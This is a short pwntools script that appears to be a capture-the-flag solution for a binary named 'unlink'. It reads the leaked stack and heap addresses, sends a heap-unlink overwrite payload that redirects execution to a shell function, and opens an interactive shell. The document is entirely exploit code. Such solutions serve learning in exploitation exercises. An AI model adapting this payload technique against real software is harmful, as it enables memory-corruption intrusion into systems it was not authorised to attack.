
from pwn import *
context(os='linux', log_level='debug')
p=process("./unlink")
shell_addr=0x80484eb
stack_addr=p.recvline()
stack_addr=stack_addr.split(": 0x")[1][:-1]
stack_addr=int(stack_addr,16)

heap_addr=p.recvline()
heap_addr=heap_addr.split(": 0x")[1][:-1]
heap_addr=int(heap_addr,16)

p.recvuntil("get shell!\n")
payload=p32(shell_addr)+"a"*12+p32(heap_addr+12)+p32(stack_addr+16)
p.sendline(payload)
p.interactive()


